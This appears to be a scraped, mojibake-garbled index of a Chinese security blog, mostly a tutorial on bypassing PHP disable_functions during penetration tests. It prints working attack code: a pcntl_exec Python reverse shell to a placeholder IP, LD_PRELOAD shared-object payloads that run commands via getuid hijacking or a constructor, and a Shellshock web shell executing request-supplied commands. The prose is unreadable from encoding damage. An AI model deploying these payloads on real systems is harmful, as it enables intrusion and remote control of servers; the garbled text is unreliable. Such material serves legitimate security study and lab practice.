å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["ä»£ç å®¡è®¡"],"content":"å‚è€ƒ phith0n Java æ¼«è°ˆç³»åˆ— Javaååºåˆ—åŒ–æ¼æ´åŸç†è§£æ Javaååºåˆ—åŒ–æ¼æ´ä»å…¥é—¨åˆ°å…³é—¨ ä»0å¼€å§‹å­¦Javaååºåˆ—åŒ–æ¼æ´ æ·±å…¥ç†è§£ JAVA ååºåˆ—åŒ–æ¼æ´ Javaååºåˆ—åŒ–åˆ©ç”¨é“¾è¡¥å…¨è®¡åˆ’ Commons-Collections åˆ©ç”¨é“¾åˆ†æ CCé“¾ 1-7 åˆ†æ Java å®‰å…¨å­¦ä¹  Day2 â€“ ysoserial CC ç³»åˆ— ","date":"2021-08-30","objectID":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/:5:0","tags":["ä»£ç å®¡è®¡"],"title":"Javaååºåˆ—åŒ–æ¼æ´ç³»åˆ—-4","uri":"/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-4/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å¸¸è§ Bypass Disable Functions æ–¹æ³•æ€»ç»“","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"å¸¸è§ Bypass Disable Functions æ–¹æ³•æ€»ç»“ ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:0:0","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"1 èƒŒæ™¯ PHP.ini ä¸­å¯ä»¥è®¾ç½®ç¦ç”¨ä¸€äº›å±é™©å‡½æ•°ï¼Œä¾‹å¦‚ evalã€execã€system ç­‰ï¼Œå°†å…¶å†™åœ¨ php.ini é…ç½®æ–‡ä»¶ä¸­ï¼Œå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„ disable_functions äº†ï¼Œç‰¹åˆ«æ˜¯è™šæ‹Ÿä¸»æœºè¿è¥å•†ï¼Œä¸ºäº†å½»åº•éš”ç¦»åŒæœåŠ¡å™¨çš„å®¢æˆ·ï¼Œä»¥åŠé¿å…å‡ºç°å¤§é¢ç§¯çš„å®‰å…¨é—®é¢˜ï¼Œåœ¨ disable_functions çš„è®¾ç½®ä¸­ä¹Ÿé€šå¸¸è¾ƒä¸ºä¸¥æ ¼ã€‚ å¦‚æœåœ¨æ¸—é€æ—¶ï¼Œä¸Šä¼ äº† webshell å´å› ä¸º disable_functions ç¦ç”¨äº†å‡½æ•°è€Œæ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œè¿™æ—¶å€™å°±éœ€è¦æƒ³åŠæ³•è¿›è¡Œç»•è¿‡ï¼Œçªç ´ disable_functionsã€‚ ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:1:0","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2 é»‘åå•ç»•è¿‡ å³ä¾¿æ˜¯é€šè¿‡ disable functions é™åˆ¶å±é™©å‡½æ•°ï¼Œä¹Ÿå¯èƒ½ä¼šæœ‰é™åˆ¶ä¸å…¨çš„æƒ…å†µã€‚å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°å¯ä»¥å‚è€ƒï¼šPHP webshell æ£€æµ‹ã€‚è¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒå¸¸è§çš„æ˜“è¢«å¿½ç•¥çš„å‡½æ•°å°±æ˜¯ pcntl_execã€‚ pcntl æ˜¯ linux ä¸‹çš„ä¸€ä¸ªæ‰©å±•ï¼Œå¯ä»¥æ”¯æŒ php çš„å¤šçº¿ç¨‹æ“ä½œã€‚å¾ˆå¤šæ—¶å€™ä¼šç¢°åˆ°ç¦ç”¨ exec å‡½æ•°çš„æƒ…å†µï¼Œä½†å¦‚æœè¿ç»´äººå‘˜å®‰å…¨æ„è¯†ä¸å¼ºæˆ–å¯¹ PHP ä¸ç”šäº†è§£ï¼Œåˆ™å¾ˆæœ‰å¯èƒ½å¿½ç•¥ pcntl æ‰©å±•çš„ç›¸å…³å‡½æ•°ã€‚ ä½¿ç”¨ pcntl_exec çš„å‰ææ˜¯å¼€å¯äº† pcntl æ’ä»¶ã€‚ \u003c?php if(function_exists('pcntl_exec')) { pcntl_exec(\"/bin/bash\", array(\"/tmp/test.sh\")); } else { echo 'pcntl extension is not support!'; } ?\u003e ç”±äº pcntl_exec() æ‰§è¡Œå‘½ä»¤æ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œæ‰€ä»¥å…¶å¸¸ä¸ python ç»“åˆæ¥åå¼¹ shellï¼š \u003c?php pcntl_exec(\"/usr/bin/python\",array('-c','import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM,socket.SOL_TCP);s.connect((\"IP\",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);')); è“å¸½æ¯å†³èµ›ä¸­å­˜åœ¨ç›¸å…³åˆ©ç”¨æ–¹å¼ã€‚ ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:2:0","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3 åˆ©ç”¨ LD_PRELOAD ç¯å¢ƒå˜é‡ ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:3:0","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3.1 åŸç† LD_PRELOAD æ˜¯ Linux ç³»ç»Ÿçš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒå¯ä»¥å½±å“ç¨‹åºçš„è¿è¡Œæ—¶çš„é“¾æ¥ï¼ˆRuntime linkerï¼‰ï¼Œå®ƒå¯ä»¥åœ¨ç”¨æˆ·çš„ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½è¯¥åŠ¨æ€é“¾æ¥åº“ã€‚è¿™ä¸ªåŠŸèƒ½ä¸»è¦å°±æ˜¯ç”¨æ¥æœ‰é€‰æ‹©æ€§çš„è½½å…¥ä¸åŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸åŒå‡½æ•°ã€‚é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸»ç¨‹åºå’Œå…¶åŠ¨æ€é“¾æ¥åº“çš„ä¸­é—´åŠ è½½åˆ«çš„åŠ¨æ€é“¾æ¥åº“ï¼Œç”šè‡³è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ã€‚ä¸€æ–¹é¢ï¼Œå¯ä»¥åˆ©ç”¨æ­¤åŠŸèƒ½æ¥ä½¿ç”¨è‡ªå®šä¹‰çš„å‡½æ•°ï¼Œè€Œå¦ä¸€æ–¹é¢ï¼Œå¯ä»¥å‘åˆ«äººçš„ç¨‹åºæ³¨å…¥ç¨‹åºï¼Œä»è€Œè¾¾åˆ°ç‰¹å®šçš„æ”»å‡»ç›®çš„ã€‚ å‰æï¼š èƒ½å¤Ÿä¸Šä¼  .so æ–‡ä»¶ èƒ½å¤Ÿæ§åˆ¶ LD_PRELOAD ç¯å¢ƒå˜é‡çš„å€¼ï¼Œæ¯”å¦‚ putenv() å‡½æ•° å› ä¸ºæ–°è¿›ç¨‹å¯åŠ¨å°†åŠ è½½ LD_PRELOAD ä¸­çš„ .so æ–‡ä»¶ï¼Œæ‰€ä»¥è¦å­˜åœ¨å¯ä»¥æ§åˆ¶ PHP å¯åŠ¨å¤–éƒ¨ç¨‹åºçš„å‡½æ•°å¹¶èƒ½æ‰§è¡Œï¼Œæ¯”å¦‚ mail()ã€imap_mail()ã€mb_send_mail() å’Œ error_log() å‡½æ•°ç­‰ ä¸‹é¢ä»‹ç»ä¸¤ç§å¸¸ç”¨çš„åˆ©ç”¨æ–¹å¼ã€‚ ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:3:1","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3.2 åŠ«æŒå‡½æ•°(uid) 3.2.1 åŸç† ç¼–å†™ä¸€ä¸ªåŸå‹ä¸º uid_t getuid(void); çš„ C å‡½æ•°ï¼Œå†…éƒ¨æ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„ä»£ç ï¼Œå¹¶ç¼–è¯‘æˆå…±äº«å¯¹è±¡ getuid_shadow.soï¼› è¿è¡Œ PHP å‡½æ•° putenv()ï¼ˆç”¨æ¥é…ç½®ç³»ç»Ÿç¯å¢ƒå˜é‡ï¼‰ï¼Œè®¾å®šç¯å¢ƒå˜é‡ LD_PRELOAD ä¸º getuid_shadow.soï¼Œä»¥ä¾¿åç»­å¯åŠ¨æ–°è¿›ç¨‹æ—¶ä¼˜å…ˆåŠ è½½è¯¥å…±äº«å¯¹è±¡ï¼› è¿è¡Œ PHP çš„ mail() å‡½æ•°ï¼Œmail() å†…éƒ¨å¯åŠ¨æ–°è¿›ç¨‹ /usr/sbin/sendmailï¼Œç”±äºä¸Šä¸€æ­¥ LD_PRELOAD çš„ä½œç”¨ï¼Œsendmail è°ƒç”¨çš„ç³»ç»Ÿå‡½æ•° getuid() è¢«ä¼˜å…ˆçº§æ›´å¥½çš„ getuid_shadow.so ä¸­çš„åŒå getuid() æ‰€åŠ«æŒï¼›è¾¾åˆ°ä¸è°ƒç”¨ PHP çš„å„ç§å‘½ä»¤æ‰§è¡Œå‡½æ•°ï¼ˆsystemã€exec ç­‰ç­‰ï¼‰ä»å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„ç›®çš„ã€‚ 3.2.2 åˆ©ç”¨ #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \u003cstring.h\u003e void payload() { system(\"ls \u003e /tmp/leon\"); } int getuid() { if (getenv(\"LD_PRELOAD\") == NULL) { return 0; } unsetenv(\"LD_PRELOAD\"); payload(); } ç¼–è¯‘æˆ so æ–‡ä»¶ï¼š gcc -c -fPIC exp.c -o hack \u0026\u0026 gcc --share hack -o exp.so ç¼–å†™ test.phpï¼š \u003c?php putenv(\"LD_PRELOAD=./exp.so\"); mail(\"\",\"\",\"\",\"\",\"\"); ?\u003e ä½†æ˜¯ï¼Œåœ¨çœŸå®ç¯å¢ƒä¸­ï¼Œå­˜åœ¨ä¸¤æ–¹é¢é—®é¢˜ï¼š ä¸€æ˜¯ï¼ŒæŸäº›ç¯å¢ƒä¸­ï¼Œweb ç¦æ­¢å¯ç”¨ sendmailã€ç”šè‡³ç³»ç»Ÿä¸Šæ ¹æœ¬æœªå®‰è£… sendmailï¼Œä¹Ÿå°±è°ˆä¸ä¸ŠåŠ«æŒ getuid()ï¼Œé€šå¸¸çš„ www-data æƒé™åˆä¸å¯èƒ½å»æ›´æ”¹ php.ini é…ç½®ã€å»å®‰è£… sendmail è½¯ä»¶ï¼› äºŒæ˜¯ï¼Œå³ä¾¿ç›®æ ‡å¯ä»¥å¯ç”¨ sendmailï¼Œç”±äºæœªå°†ä¸»æœºåï¼ˆhostname è¾“å‡ºï¼‰æ·»åŠ è¿› hosts ä¸­ï¼Œå¯¼è‡´æ¯æ¬¡è¿è¡Œ sendmail éƒ½è¦è€—æ—¶åŠåˆ†é’Ÿç­‰å¾…åŸŸåè§£æè¶…æ—¶è¿”å›ï¼Œwww-data ä¹Ÿæ— æ³•å°†ä¸»æœºååŠ å…¥ hostsã€‚ åŸºäºè¿™ä¸¤ç§æ–¹å¼ï¼Œè¡ç”Ÿå‡ºä¸€ç§æ–°çš„åˆ©ç”¨æ–¹å¼ã€‚ ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:3:2","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"3.3 åŠ«æŒå¯åŠ¨è¿›ç¨‹ å›åˆ° LD_PRELOAD æœ¬èº«ï¼Œç³»ç»Ÿé€šè¿‡å®ƒé¢„å…ˆåŠ è½½å…±äº«å¯¹è±¡ï¼Œå¦‚æœèƒ½æ‰¾åˆ°ä¸€ä¸ªæ–¹å¼ï¼Œåœ¨åŠ è½½æ—¶å°±æ‰§è¡Œä»£ç ï¼Œè€Œä¸ç”¨è€ƒè™‘åŠ«æŒæŸä¸€ç³»ç»Ÿå‡½æ•°ï¼Œé‚£å°±å®Œå…¨å¯ä»¥ä¸ä¾èµ– sendmail äº†ã€‚ 3.3.1 __attribute__ ä»‹ç» GCC æœ‰ä¸ª C è¯­è¨€æ‰©å±•ä¿®é¥°ç¬¦ __attribute__((constructor))ï¼Œå¯ä»¥è®©ç”±å®ƒä¿®é¥°çš„å‡½æ•°åœ¨ main() ä¹‹å‰æ‰§è¡Œï¼Œè‹¥å®ƒå‡ºç°åœ¨å…±äº«å¯¹è±¡ä¸­æ—¶ï¼Œé‚£ä¹ˆä¸€æ—¦å…±äº«å¯¹è±¡è¢«ç³»ç»ŸåŠ è½½ï¼Œç«‹å³å°†æ‰§è¡Œ __attribute__((constructor)) ä¿®é¥°çš„å‡½æ•°ã€‚ 3.2.2 åˆ©ç”¨ ç®€å•çš„ expï¼š #define _GNU_SOURCE #include \u003cstdlib.h\u003e #include \u003cunistd.h\u003e #include \u003csys/types.h\u003e __attribute__ ((__constructor__)) void preload (void){ unsetenv(\"LD_PRELOAD\"); system(\"whoami \u003e /tmp/leon\"); } ä½†æ˜¯unsetenv()åœ¨ Centos ä¸Šæ— æ•ˆï¼Œå› ä¸º Centos è‡ªå·±ä¹Ÿhookäº† unsetenv()ï¼Œåœ¨å…¶å†…éƒ¨å¯åŠ¨äº†å…¶ä»–è¿›ç¨‹ï¼Œæ¥ä¸åŠåˆ é™¤ LD_PRELOAD å°±åˆè¢«åŠ«æŒï¼Œå¯¼è‡´æ— é™å¾ªç¯ï¼Œå¯ä»¥ä½¿ç”¨å…¨å±€å˜é‡ extern char** environåˆ é™¤ï¼Œå®é™…ä¸Šï¼Œunsetenv() å°±æ˜¯å¯¹ environ çš„ç®€å•å°è£…å®ç°çš„ç¯å¢ƒå˜é‡åˆ é™¤åŠŸèƒ½ã€‚ #define _GNU_SOURCE #include \u003cstdlib.h\u003e #include \u003cstdio.h\u003e #include \u003cstring.h\u003e extern char** environ; __attribute__ ((__constructor__)) void preload (void) { // get command line options and arg const char* cmdline = getenv(\"EVIL_CMDLINE\"); // unset environment variable LD_PRELOAD. // unsetenv(\"LD_PRELOAD\") no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], \"LD_PRELOAD\")) { environ[i][0] = '\\0'; } } // executive command system(cmdline); } ä½¿ç”¨ for å¾ªç¯ä¿®æ”¹ LD_PRELOAD çš„é¦–ä¸ªå­—ç¬¦æ”¹æˆ \\0ï¼Œ\\0 æ˜¯ C è¯­è¨€å­—ç¬¦ä¸²ç»“æŸæ ‡è®°ï¼Œè¿™æ ·å¯ä»¥è®©ç³»ç»ŸåŸæœ‰çš„ LD_PRELOAD ç¯å¢ƒå˜é‡è‡ªåŠ¨å¤±æ•ˆã€‚ ç¼–è¯‘ï¼š gcc -c -fPIC exp.c -o hack \u0026\u0026 gcc --share hack -o exp.so è¯¦æƒ…å¯è§ï¼šbypass_disablefunc_via_LD_PRELOADã€‚ åœ¨ AntSword-Labs æœ‰ç›¸å…³ç¯å¢ƒï¼Œå¤ç°è¯¥æ¼æ´ã€‚ å°è¯•æ‰§è¡Œå‘½ä»¤ï¼š ä½¿ç”¨ LD_PRELOAD æ’ä»¶ç»•è¿‡ï¼š æˆåŠŸåå¯ä»¥çœ‹åˆ° /var/www/html/ ç›®å½•ä¸‹æ–°å»ºäº†ä¸€ä¸ª .antproxy.php æ–‡ä»¶ã€‚æˆ‘ä»¬åˆ›å»ºå‰¯æœ¬, å¹¶å°†è¿æ¥çš„ URL shell è„šæœ¬åå­—æ”¹ä¸º .antproxy.phpï¼Œå°±å¯ä»¥æˆåŠŸæ‰§è¡Œå‘½ä»¤ã€‚ ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:3:3","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"4 åˆ©ç”¨ã€Œç ´å£³æ¼æ´ã€- ShellShock ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:4:0","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"4.1 å‰æ Linux æ“ä½œç³»ç»Ÿ putenv()ã€mail() æˆ– error_log() å‡½æ•°å¯ç”¨ ç›®æ ‡ç³»ç»Ÿçš„ /bin/bash å­˜åœ¨ CVE-2014-6271 æ¼æ´ /bin/sh -\u003e /bin/bash sh é»˜è®¤çš„ shell æ˜¯ bash ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:4:1","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"4.2 åŸç† è¯¥æ–¹æ³•åˆ©ç”¨çš„ bash ä¸­çš„ä¸€ä¸ªè€æ¼æ´ï¼Œå³ Bash Shellshock ç ´å£³æ¼æ´ï¼ˆCVE-2014-6271ï¼‰ã€‚ åœ¨ Bash ä¸­ä¸€ç§ç‹¬æœ‰çš„æ–¹æ³•æ¥å®šä¹‰å‡½æ•° , å³ : é€šè¿‡ç¯å¢ƒå˜é‡æ¥å®šä¹‰å‡½æ•°ã€‚å½“æŸä¸ªç¯å¢ƒå˜é‡çš„å€¼ä»¥å­—ç¬¦ä¸² () { çš„æ ¼å¼ä½œä¸ºå¼€å¤´ï¼Œ é‚£ä¹ˆè¯¥å˜é‡å°±ä¼šè¢«å½“å‰ Bash å½“ä½œä¸€ä¸ªå¯¼å‡ºå‡½æ•°( export function ) , è¯¥å‡½æ•°ä»…ä¼šåœ¨å½“å‰ Bash çš„å­è¿›ç¨‹ä¸­ç”Ÿæ•ˆã€‚ ä¸€èˆ¬å‡½æ•°ä½“å†…çš„ä»£ç ä¸ä¼šè¢«æ‰§è¡Œï¼Œä½†ç ´å£³æ¼æ´ä¼šé”™è¯¯çš„å°† {} èŠ±æ‹¬å·å¤–çš„å‘½ä»¤è¿›è¡Œæ‰§è¡Œã€‚PHP é‡Œçš„æŸäº›å‡½æ•°ï¼ˆä¾‹å¦‚ï¼šmail()ã€imap_mail()ï¼‰èƒ½è°ƒç”¨ popen æˆ–å…¶ä»–èƒ½å¤Ÿæ´¾ç”Ÿ bash å­è¿›ç¨‹çš„å‡½æ•°ï¼Œå¯ä»¥é€šè¿‡è¿™äº›å‡½æ•°æ¥è§¦å‘ç ´å£³æ¼æ´(CVE-2014-6271)æ‰§è¡Œå‘½ä»¤ã€‚ EXP è„šæœ¬ï¼š \u003c?php function runcmd($c){ $d = dirname($_SERVER[\"SCRIPT_FILENAME\"]); if(substr($d, 0, 1) == \"/\" \u0026\u0026 function_exists('putenv') \u0026\u0026 (function_exists('error_log') || function_exists('mail'))){ if(strstr(readlink(\"/bin/sh\"), \"bash\")!=FALSE){ $tmp=tempnam(sys_get_temp_dir(), 'as'); putenv(\"PHP_LOL=() { x; }; $c \u003e$tmp 2\u003e\u00261\"); if (function_exists('error_log')) { error_log(\"a\", 1); }else{ mail(\"a@127.0.0.1\", \"\", \"\", \"-bv\"); } }else{ print(\"Not vuln (not bash)\\n\"); } $output = @file_get_contents($tmp); @unlink($tmp); if($output!=\"\"){ print($output); }else{ print(\"No output, or not vuln.\"); } }else{ print(\"ä¸æ»¡è¶³ä½¿ç”¨æ¡ä»¶\"); } } // runcmd(\"whoami\"); // è¦æ‰§è¡Œçš„å‘½ä»¤ runcmd($_REQUEST[\"cmd\"]); // ?cmd=whoami ?\u003e ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:4:2","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"4.3 åˆ©ç”¨ åŒæ ·åˆ©ç”¨ AntSword-Labs é‡Œçš„ç¯å¢ƒï¼šbypass_disable_functions/2 å°è¯•ä½¿ç”¨ http://IP:18080/?ant=system('ls'); æ‰§è¡Œå¤±è´¥ã€‚ AntSword è™šæ‹Ÿç»ˆç«¯ä¸­å·²ç»é›†æˆäº†å¯¹ ShellShock çš„åˆ©ç”¨ï¼Œç›´æ¥åœ¨è™šæ‹Ÿç»ˆç«¯æ‰§è¡Œå‘½ä»¤å³å¯ç»•è¿‡disable_functionsï¼š ä¸Šå›¾ä¸­è¿›ç¨‹æ ‘å¯ä»¥çœ‹åˆ°ï¼Œåˆ©ç”¨äº† PHP error_log å‡½æ•°åœ¨æ‰§è¡Œ sh -c -t -i æ—¶, Bash çš„ ShellShock æ¼æ´, ä»è€Œå®ç°äº†æ‰§è¡Œæˆ‘ä»¬è‡ªå®šä¹‰å‘½ä»¤çš„ç›®çš„ã€‚ ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:4:3","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"5 åˆ©ç”¨ CGI ","date":"2021-08-30","objectID":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/:5:0","tags":["æ¸—é€æµ‹è¯•"],"title":"å¸¸è§Bypass Disable Functionsæ–¹æ³•","uri":"/2021/08/%E5%B8%B8%E8%A7%81bypass-disable-functions%E6%96%B9%E6%B3%95/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"5.1 Apache Mod CGI 5.1.1 å‰æ Linux æ“ä½œç³»ç»Ÿ Apache + PHP (apache ä½¿ç”¨ apache_mod_php) Apache å¼€å¯äº† cgiã€rewrite Web ç›®å½•ç»™äº† AllowOverride æƒé™ å½“å‰ç›®å½•å¯å†™ 5.1.2 åŸç† ä¸ºäº†è§£å†³ Web æœåŠ¡å™¨ä¸å¤–éƒ¨åº”ç”¨ç¨‹åºï¼ˆCGIç¨‹åºï¼‰ä¹‹é—´æ•°æ®äº’é€šï¼Œäºæ˜¯å‡ºç°äº†CGIï¼ˆCommon Gateway Interfaceï¼‰é€šç”¨ç½‘å…³æ¥å£ã€‚ç®€å•ç†è§£ï¼Œå¯ä»¥è®¤ä¸º CGI æ˜¯ Web æœåŠ¡å™¨å’Œè¿è¡Œåœ¨å…¶ä¸Šçš„åº”ç”¨ç¨‹åºè¿›è¡Œâ€œäº¤æµâ€çš„ä¸€ç§çº¦å®šã€‚ å½“é‡åˆ°åŠ¨æ€è„šæœ¬è¯·æ±‚æ—¶ï¼ŒWeb æœåŠ¡å™¨ä¸»è¿›ç¨‹å°±ä¼š Fork åˆ›å»ºå‡ºä¸€ä¸ªæ–°çš„è¿›ç¨‹æ¥å¯åŠ¨ CGI ç¨‹åºï¼Œè¿è¡Œå¤–éƒ¨ C ç¨‹åºæˆ– Perlã€PHP è„šæœ¬ç­‰ï¼Œä¹Ÿå°±æ˜¯å°†åŠ¨æ€è„šæœ¬äº¤ç»™ CGI ç¨‹åºæ¥å¤„ç†ã€‚å¯åŠ¨ CGI ç¨‹åºéœ€è¦ä¸€ä¸ªè¿‡ç¨‹ï¼Œå¦‚è¯»å–é…ç½®æ–‡ä»¶ã€åŠ è½½æ‰©å±•ç­‰ã€‚å½“ CGI ç¨‹åºå¯åŠ¨åä¼šå»è§£æåŠ¨æ€è„šæœ¬ï¼Œç„¶åå°†ç»“æœè¿”å›ç»™ Web æœåŠ¡å™¨ï¼Œæœ€åç”± Web æœåŠ¡å™¨å°†ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ï¼Œä¹‹å‰ Fork å‡ºæ¥çš„è¿›ç¨‹ä¹Ÿéšä¹‹å…³é—­ã€‚è¿™æ ·ï¼Œæ¯æ¬¡ç”¨æˆ·è¯·æ±‚åŠ¨æ€è„šæœ¬ï¼ŒWeb æœåŠ¡å™¨éƒ½è¦é‡æ–° Fork åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹å»å¯åŠ¨ CGI ç¨‹åºï¼Œç”± CGI ç¨‹åºæ¥å¤„ç†åŠ¨æ€è„šæœ¬ï¼Œå¤„ç†å®Œæˆåè¿›ç¨‹éšä¹‹å…³é—­ï¼Œå…¶æ•ˆç‡æ˜¯éå¸¸ä½ä¸‹çš„ã€‚ è€Œå¯¹äº Mod CGIï¼ŒWeb æœåŠ¡å™¨å¯ä»¥å†…ç½® Perl è§£é‡Šå™¨æˆ– PHP è§£é‡Šå™¨ã€‚ ä¹Ÿå°±æ˜¯è¯´å°†è¿™äº›è§£é‡Šå™¨åšæˆæ¨¡å—çš„æ–¹å¼ï¼ŒWeb æœåŠ¡å™¨ä¼šåœ¨å¯åŠ¨çš„æ—¶å€™å°±å¯åŠ¨è¿™äº›è§£é‡Šå™¨ã€‚ å½“æœ‰æ–°çš„åŠ¨æ€è¯·æ±‚è¿›æ¥æ—¶ï¼ŒWeb æœåŠ¡å™¨å°±æ˜¯è‡ªå·±è§£æè¿™äº›åŠ¨æ€è„šæœ¬ï¼Œçœå¾—é‡æ–° Fork ä¸€ä¸ªè¿›ç¨‹ï¼Œæ•ˆç‡æé«˜äº†ã€‚ ä»»ä½•å…·æœ‰ MIME ç±»å‹ application/x-httpd-cgi æˆ–è€…è¢« cgi-script å¤„ç†å™¨å¤„ç†çš„æ–‡ä»¶éƒ½å°†è¢«ä½œä¸º CGI è„šæœ¬å¯¹å¾…å¹¶ç”±æœåŠ¡å™¨è¿è¡Œï¼Œå®ƒçš„è¾“å‡ºå°†è¢«è¿”å›ç»™å®¢æˆ·ç«¯ã€‚å¯ä»¥é€šè¿‡ä¸¤ç§é€”å¾„ä½¿æ–‡ä»¶æˆä¸º CGI è„šæœ¬ï¼Œä¸€ç§æ˜¯æ–‡ä»¶å…·æœ‰å·²ç”± AddType æŒ‡ä»¤å®šä¹‰çš„æ‰©å±•åï¼Œå¦ä¸€ç§æ˜¯æ–‡ä»¶ä½äº ScriptAlias ç›®å½•ä¸­ã€‚ Apache åœ¨é…ç½®å¼€å¯ CGI åå¯ä»¥ç”¨ ScriptAlias æŒ‡ä»¤æŒ‡å®šä¸€ä¸ªç›®å½•ï¼ŒæŒ‡å®šçš„ç›®å½•ä¸‹é¢ä¾¿å¯ä»¥å­˜æ”¾å¯æ‰§è¡Œçš„ CGI ç¨‹åºã€‚è‹¥æ˜¯æƒ³ä¸´æ—¶å…è®¸ä¸€ä¸ªç›®å½•å¯ä»¥æ‰§è¡Œ CGI 